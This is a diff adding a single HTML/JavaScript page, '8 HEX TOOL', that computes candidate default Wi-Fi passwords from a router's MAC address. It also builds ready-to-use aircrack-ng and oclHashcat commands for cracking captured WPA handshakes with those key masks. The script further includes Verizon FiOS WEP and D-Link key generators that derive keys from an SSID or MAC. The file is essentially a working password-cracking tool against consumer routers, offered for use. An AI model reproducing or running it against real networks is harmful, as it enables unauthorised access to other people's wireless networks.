@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="windows-1252">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="robots" content="noindex,nofollow" />
+<title>8 HEX TOOL</title>
+<script type="text/javascript">
+var router_mac, char_1, char_2, char_3, char_4, char_5, char_6, char_7, char_8, keymask1, keymask2;
+function add1(c) { c = c.toUpperCase(); return c=="0"?"1":c=="1"?"2":c=="2"?"3":c=="3"?"4":c=="4"?"5":c=="5"?"6":c=="6"?"7":c=="7"?"8":c=="8"?"9":c=="9"?"A":c=="A"?"B":c=="B"?"C":c=="C"?"D":c=="D"?"E":c=="E"?"F":c=="F"?"0":c; }
+function minus1(c) { c = c.toUpperCase(); return c=="0"?"F":c=="1"?"0":c=="2"?"1":c=="3"?"2":c=="4"?"3":c=="5"?"4":c=="6"?"5":c=="7"?"6":c=="8"?"7":c=="9"?"8":c=="A"?"9":c=="B"?"A":c=="C"?"B":c=="D"?"C":c=="E"?"D":c=="F"?"E":c; }
+function combo1_flipchar(c) { c = c.toUpperCase(); return c=="1"?"2":c=="2"?"4":c=="3"?"6":c=="4"?"1":c=="5"?"3":c=="6"?"5":c=="9"?"A":c=="A"?"C":c=="B"?"E":c=="C"?"9":c=="D"?"B":c=="E"?"D":c; }
+function combo2_flipchar(c) { c = c.toLowerCase(); return c=="0"?"9":c=="1"?"4":c=="2"?"4":c=="3"?"6":c=="4"?"2":c=="5"?"6":c=="6"?"3":c=="9"?"a":c=="a"?"c":c=="b"?"e":c=="c"?"9":c=="d"?"b":c=="e"?"d":c; }
+function append_results(c1,c2,c3,c4,c5,c6,c7,c8) {
+ if (document.getElementById('results').value != "") { document.getElementById('results').value += "\n"; }
+ // 62385174
+ document.getElementById('results').value += combo1_flipchar(c6) + combo1_flipchar(c2) + combo1_flipchar(c3) + combo1_flipchar(c8) + combo1_flipchar(c5) + combo1_flipchar(c1) + combo1_flipchar(c7) + combo1_flipchar(c4);
+ document.getElementById('results').value += "\n" + combo2_flipchar(c6) + combo2_flipchar(c2) + combo2_flipchar(c3) + combo2_flipchar(c8) + combo2_flipchar(c5) + combo2_flipchar(c1) + combo2_flipchar(c7) + combo2_flipchar(c4);
+ // 12385174
+ document.getElementById('results').value += "\n" + combo1_flipchar(c1) + combo1_flipchar(c2) + combo1_flipchar(c3) + combo1_flipchar(c8) + combo1_flipchar(c5) + combo1_flipchar(c1) + combo1_flipchar(c7) + combo1_flipchar(c4);
+ document.getElementById('results').value += "\n" + combo2_flipchar(c1) + combo2_flipchar(c2) + combo2_flipchar(c3) + combo2_flipchar(c8) + combo2_flipchar(c5) + combo2_flipchar(c1) + combo2_flipchar(c7) + combo2_flipchar(c4);
+ // 12385674
+ document.getElementById('results').value += "\n" + combo1_flipchar(c1) + combo1_flipchar(c2) + combo1_flipchar(c3) + combo1_flipchar(c8) + combo1_flipchar(c5) + combo1_flipchar(c6) + combo1_flipchar(c7) + combo1_flipchar(c4);
+ document.getElementById('results').value += "\n" + combo2_flipchar(c1) + combo2_flipchar(c2) + combo2_flipchar(c3) + combo2_flipchar(c8) + combo2_flipchar(c5) + combo2_flipchar(c6) + combo2_flipchar(c7) + combo2_flipchar(c4);
+ // 62385674
+ document.getElementById('results').value += "\n" + combo1_flipchar(c6) + combo1_flipchar(c2) + combo1_flipchar(c3) + combo1_flipchar(c8) + combo1_flipchar(c5) + combo1_flipchar(c6) + combo1_flipchar(c7) + combo1_flipchar(c4);
+ document.getElementById('results').value += "\n" + combo2_flipchar(c6) + combo2_flipchar(c2) + combo2_flipchar(c3) + combo2_flipchar(c8) + combo2_flipchar(c5) + combo2_flipchar(c6) + combo2_flipchar(c7) + combo2_flipchar(c4);
+ // make keymask
+ if (keymask1.indexOf(combo1_flipchar(c1)) == -1) { keymask1 += combo1_flipchar(c1); }
+ if (keymask1.indexOf(combo1_flipchar(c2)) == -1) { keymask1 += combo1_flipchar(c2); }
+ if (keymask1.indexOf(combo1_flipchar(c3)) == -1) { keymask1 += combo1_flipchar(c3); }
+ if (keymask1.indexOf(combo1_flipchar(c4)) == -1) { keymask1 += combo1_flipchar(c4); }
+ if (keymask1.indexOf(combo1_flipchar(c5)) == -1) { keymask1 += combo1_flipchar(c5); }
+ if (keymask1.indexOf(combo1_flipchar(c6)) == -1) { keymask1 += combo1_flipchar(c6); }
+ if (keymask1.indexOf(combo1_flipchar(c7)) == -1) { keymask1 += combo1_flipchar(c7); }
+ if (keymask1.indexOf(combo1_flipchar(c8)) == -1) { keymask1 += combo1_flipchar(c8); }
+ if (keymask2.indexOf(combo2_flipchar(c1)) == -1) { keymask2 += combo2_flipchar(c1); }
+ if (keymask2.indexOf(combo2_flipchar(c2)) == -1) { keymask2 += combo2_flipchar(c2); }
+ if (keymask2.indexOf(combo2_flipchar(c3)) == -1) { keymask2 += combo2_flipchar(c3); }
+ if (keymask2.indexOf(combo2_flipchar(c4)) == -1) { keymask2 += combo2_flipchar(c4); }
+ if (keymask2.indexOf(combo2_flipchar(c5)) == -1) { keymask2 += combo2_flipchar(c5); }
+ if (keymask2.indexOf(combo2_flipchar(c6)) == -1) { keymask2 += combo2_flipchar(c6); }
+ if (keymask2.indexOf(combo2_flipchar(c7)) == -1) { keymask2 += combo2_flipchar(c7); }
+ if (keymask2.indexOf(combo2_flipchar(c8)) == -1) { keymask2 += combo2_flipchar(c8); }
+}
+function btn_click() {
+if (document.getElementById('mac').value.trim().length == 12) { document.getElementById('mac').value = document.getElementById('mac').value.substr(0,2) + ":" +  document.getElementById('mac').value.substr(2,2) + ":" + document.getElementById('mac').value.substr(4,2) + ":" + document.getElementById('mac').value.substr(6,2) + ":" + document.getElementById('mac').value.substr(8,2) + ":" + document.getElementById('mac').value.substr(10,2); }
+if (document.getElementById('mac').value.trim().length == 8) { document.getElementById('mac').value = document.getElementById('mac').value.substr(0,2) + ":" +  document.getElementById('mac').value.substr(2,2) + ":" + document.getElementById('mac').value.substr(4,2) + ":" + document.getElementById('mac').value.substr(6,2); }
+if (document.getElementById('mac').value.trim().length == 11) { document.getElementById('mac').value = "XX:XX:" + document.getElementById('mac').value; }
+if (document.getElementById('mac').value.trim().length != 17) { alert('Router MAC is not the correct length'); }
+else {
+ document.getElementById('results').value = ""; keymask1 = ""; keymask2 = "";
+
+// document.getElementById('results').value = verizon_fios_wep_keygen("PP4RQ");
+
+ // mac
+ router_mac = document.getElementById('mac').value.toUpperCase().trim().substr(6).replace(/:/g,"");
+ char_1 = router_mac.substr(0,1); char_2 = router_mac.substr(1,1); char_3 = router_mac.substr(2,1); char_4 = router_mac.substr(3,1); char_5 = router_mac.substr(4,1); char_6 = router_mac.substr(5,1); char_7 = router_mac.substr(6,1); char_8 = router_mac.substr(7,1);
+ append_results(char_1,char_2,char_3,char_4,char_5,char_6,char_7,char_8);
+ // mac +1
+ char_7 = ((router_mac.substr(7,1)=="F")?add1(router_mac.substr(6,1)):router_mac.substr(6,1));
+ char_8 = add1(router_mac.substr(7,1));
+ append_results(char_1,char_2,char_3,char_4,char_5,char_6,char_7,char_8);
+ // mac +2
+ char_7 = ((router_mac.substr(7,1)=="E")?add1(router_mac.substr(6,1)):router_mac.substr(6,1)); 
+ char_8 = add1(add1(router_mac.substr(7,1)));
+ append_results(char_1,char_2,char_3,char_4,char_5,char_6,char_7,char_8);
+ // mac -1
+ char_7 = ((router_mac.substr(7,1)=="0")?minus1(router_mac.substr(6,1)):router_mac.substr(6,1));
+ char_8 = minus1(router_mac.substr(7,1));
+ append_results(char_1,char_2,char_3,char_4,char_5,char_6,char_7,char_8);
+ // mac -2
+ char_7 = ((router_mac.substr(7,1)=="1")?minus1(router_mac.substr(6,1)):router_mac.substr(6,1));
+ char_8 = minus1(minus1(router_mac.substr(7,1)));
+ append_results(char_1,char_2,char_3,char_4,char_5,char_6,char_7,char_8);
+ // commands
+ document.getElementById('ac').value = "aircrack-ng -a 2 -b " + document.getElementById('mac').value.toUpperCase().trim() + " -w wordlist.txt capture.cap";
+ document.getElementById('upper').value = "oclHashcat64.exe -m 2500 -a3 capture.hccap -1 \"" + keymask1.split("").sort().toString().replace(/,/g,"") + "\" ?1?1?1?1?1?1?1?1";
+ document.getElementById('lower').value = "oclHashcat64.exe -m 2500 -a3 capture.hccap -1 \"" + keymask2.split("").sort().toString().replace(/,/g,"") + "\" ?1?1?1?1?1?1?1?1";
+}
+}
+function verizon_fios_wep_keygen(ssid) {
+ ssid = ssid.toUpperCase().trim();
+ var d1, d2, d3, d4, d5;
+ d1 = ssid.substr(0,1); d1 = (d1.charCodeAt(0) >= 65) ? (d1.charCodeAt(0) - 55) : Number(d1); d1 = d1 * 1;
+ d2 = ssid.substr(1,1); d2 = (d2.charCodeAt(0) >= 65) ? (d2.charCodeAt(0) - 55) : Number(d2); d2 = d2 * 36;
+ d3 = ssid.substr(2,1); d3 = (d3.charCodeAt(0) >= 65) ? (d3.charCodeAt(0) - 55) : Number(d3); d3 = d3 * 1296;
+ d4 = ssid.substr(3,1); d4 = (d4.charCodeAt(0) >= 65) ? (d4.charCodeAt(0) - 55) : Number(d4); d4 = d4 * 46656;
+ d5 = ssid.substr(4,1); d5 = (d5.charCodeAt(0) >= 65) ? (d5.charCodeAt(0) - 55) : Number(d5); d5 = d5 * 1679616;
+ return "1801"+(d1+d2+d3+d4+d5).toString(16).toUpperCase() + "\n" + "1F90"+(d1+d2+d3+d4+d5).toString(16).toUpperCase();
+}
+function dlink_keygen(mac) {
+ mac = mac.toUpperCase().replace(/:/g,"").trim();
+ var mac_chars = [];
+ mac_chars[0] = mac.charAt(11); mac_chars[1] = mac.charAt(0); mac_chars[2] = mac.charAt(10); mac_chars[3] = mac.charAt(1);
+ mac_chars[4] = mac.charAt(9); mac_chars[5] = mac.charAt(2); mac_chars[6] = mac.charAt(8); mac_chars[7] = mac.charAt(3);
+ mac_chars[8] = mac.charAt(7); mac_chars[9] = mac.charAt(4); mac_chars[10] = mac.charAt(6); mac_chars[11] = mac.charAt(5);
+ mac_chars[12] = mac.charAt(1); mac_chars[13] = mac.charAt(6); mac_chars[14] = mac.charAt(8); mac_chars[15] = mac.charAt(9);
+ mac_chars[16] = mac.charAt(11); mac_chars[17] = mac.charAt(2); mac_chars[18] = mac.charAt(4); mac_chars[19] = mac.charAt(10);
+ var key = [];
+ var hash = ['X','r','q','a','H','N','p','d','S','Y','w','8','6','2','1','5'];
+ var index = 0; 
+ for (var i=0; i<20; i++) { 
+  if((mac_chars[i] >= '0') && (mac_chars[i] <= '9')) { index = mac_chars[i] - '0'; }
+  else if((mac_chars[i] >= 'A') && (mac_chars[i] <= 'F')) { index = mac_chars[i] - 'A' + 10; }
+  key[i] = hash[index]; 
+ }
+ return key[0]+key[1]+key[2]+key[3]+key[4]+key[5]+key[6]+key[7]+key[8]+key[9]+key[10]+key[11]+key[12]+key[13]+key[14]+key[15]+key[16]+key[17]+key[18]+key[19];
+}
+</script>
+</head>
+<body style="font:20px 'Open Sans',calibri,sans-serif;">
+<form action="" style="background-color:inherit;font-family:inherit;">
+<label for="mac">Router MAC:</label><br>
+<input name="mac" id="mac" type="text" size="20" value="" style="font:30px monospace;padding:1px;" />
+<br><br>
+<input type="button" value="Process" onclick="btn_click()" style="font:20px 'Open Sans',calibri,sans-serif;padding:15px 75px;" />
+<br><br>
+<label for="results">Potential Keys:</label><br>
+<textarea style="font-family:inherit;font-size:18px;padding:5px;width:700px;" name="results" id="results" rows="13" cols="80" onclick="this.select()"></textarea><br><br>
+<label for="ac">aircrack-ng command:</label><br>
+<input style="font-family:inherit;font-size:20px;padding:5px;width:700px;" name="ac" id="ac" type="text" size="80" value="" onclick="this.select()" /><br><br>
+<label for="upper">oclHashcat command (upper hex):</label><br>
+<input style="font-family:inherit;font-size:20px;padding:5px;width:700px;" name="upper" id="upper" type="text" size="80" value="" onclick="this.select()" /><br><br>
+<label for="lower">oclHashcat command (lower hex):</label><br>
+<input style="font-family:inherit;font-size:20px;padding:5px;width:700px;" name="lower" id="lower" type="text" size="80" value="" onclick="this.select()" /><br><br>
+</form>
+</body>
+</html>
